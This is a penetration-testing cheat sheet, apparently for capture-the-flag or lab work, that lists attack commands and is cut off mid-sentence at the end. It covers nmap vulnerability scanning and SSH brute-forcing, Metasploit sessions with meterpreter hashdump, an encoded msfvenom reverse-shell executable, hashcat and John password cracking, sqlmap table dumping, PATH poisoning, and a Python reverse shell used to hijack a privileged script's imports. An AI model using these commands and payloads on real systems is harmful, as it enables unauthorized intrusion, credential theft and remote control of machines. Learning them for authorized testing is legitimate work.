
## General Linux stuff


### path_poisoning

`export PATH=<directory_with_poison>:$PATH`

### SUDO

#### Check what commands can be run as sudo

`sudo -l`

#### Running commands as other users with sudo

`sudo -u <user> <command>`

## Nmap

### Check for vulns with scan

```nmap -sV -vv --script="vuln" <ip>```

### Enumerate SMB shares

```nmap -p <port> --script=smb-enum-shares.nse,smb-enum-users.nse <ip>```

### List mounts available on a NFS

```nmap -p <port> --script=nfs-ls,nfs-statfs,nfs-showmount <ip>```

### Bruteforce SSH with script engine

`nmap <host> -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt`

## Metasploit

### Start Metasploit

```msfconsole -q```

### List sessions

```sessions```

### Search for and use module from nmap vuln scan

```search <vuln>```

```use <index>```

### Change reverse shell to metapreter shell

```use post/multi/manage/shell_to_metapreter```

```set session <session id of shell>```

Change to metapreter session:

```sessions -i <session id>```

#### Useful metapreter commands

```shell``` - Gain interactive shell on target box

```hashdump``` - Dump password hashes of users

```upload <src file> <dst file>``` - Upload file to target

```download <src file> <dst file>``` - Download file from target

```sysinfo``` - Get info on target box

```execute -f <file>``` - Execute file on target box

### Generate reverse shell as windows executable

```msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o <.exe>```

## Hashcat

### Identify Hash

```hash-identifier <hash>```

### Common hash types

```text
900   | MD4                                              | Raw Hash
0     | MD5                                              | Raw Hash
100   | SHA1                                             | Raw Hash
1300  | SHA2-224                                         | Raw Hash
1400  | SHA2-256                                         | Raw Hash
10800 | SHA2-384                                         | Raw Hash
1700  | SHA2-512                                         | Raw Hash
17300 | SHA3-224                                         | Raw Hash
17400 | SHA3-256                                         | Raw Hash
17500 | SHA3-384                                         | Raw Hash
17600 | SHA3-512                                         | Raw Hash
6000  | RIPEMD-160                                       | Raw Hash
600   | BLAKE2b-512                                      | Raw Hash
11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian | Raw Hash
11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian | Raw Hash
6900  | GOST R 34.11-94                                  | Raw Hash
5100  | Half MD5                                         | Raw Hash
18700 | Java Object hashCode()                           | Raw Hash
17700 | Keccak-224                                       | Raw Hash
17800 | Keccak-256                                       | Raw Hash
17900 | Keccak-384                                       | Raw Hash
18000 | Keccak-512                                       | Raw Hash
21400 | sha256(sha256_bin($pass))                        | Raw Hash
6100  | Whirlpool                                        | Raw Hash
10100 | SipHash                                          | Raw Hash
21000 | BitShares v0.x - sha512(sha512_bin(pass))        | Raw Hash
```

### Crack MD5 hash with rockyou

```hashcat -a 0 -m 0 <hash/hashfile> /usr/share/wordlists/rockyou.txt --show```

## Gobuster

### List directories and files

```gobuster dir -u http://<ip>:<port> -w <wordlist> -x <file types>```

## SQLMap

### Discover database names

```sqlmap -r <request file> --dbs```

### Show tables in database

```sqlmap -r <request file> -D <database name> --tables```

### Enum table in database

```sqlmap -r <request file> -D <database name> -T <table name> --dump```

## Windows

### Stop a service

```sc stop <service name>```

### Start a service

```sc start <service name>```

## Useful python stuff

### Hijacking imports

If a target has a python file with elevated privs that imports files, we can create a new file (contents below) with the name of the imported file to get a shell as whoever has the privs for the file.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<host>",<port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

## John

### gpg

`gpg2john <gpg_key_file> > hash`

`john --wordlist=/path/to/wordlist hash`

### ssh

`python /usr/share/john/ssh2john.py <ssh_key_file> > hash`

`john --wordlist=/path/to/wordlist hash`

## Windows

### SeImpersonationPrivilege

Allows a user to 